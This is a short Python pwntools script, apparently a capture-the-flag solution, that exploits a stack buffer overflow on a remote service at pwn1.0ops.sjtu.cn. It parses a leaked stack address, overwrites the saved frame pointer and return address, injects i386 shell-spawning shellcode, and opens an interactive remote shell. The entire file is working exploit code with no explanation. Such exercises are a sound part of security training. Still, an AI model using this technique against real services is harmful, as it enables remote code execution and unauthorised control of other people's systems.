from pwn import *

context(arch = 'i386', os = 'linux')

shellcode = asm(shellcraft.sh())

r = remote('pwn1.0ops.sjtu.cn', 10002)

x = r.recvline()
ebp = int(x[x.find(b'0x'):x.find(b'.')], 16) + 0x28
rep = 0x28

ret = ebp + 4 + 4

payload = b'A' * rep + p32(ebp) + p32(ret) + shellcode

r.sendline(payload)
print(f'payload:{payload}\n')

print(r.interactive())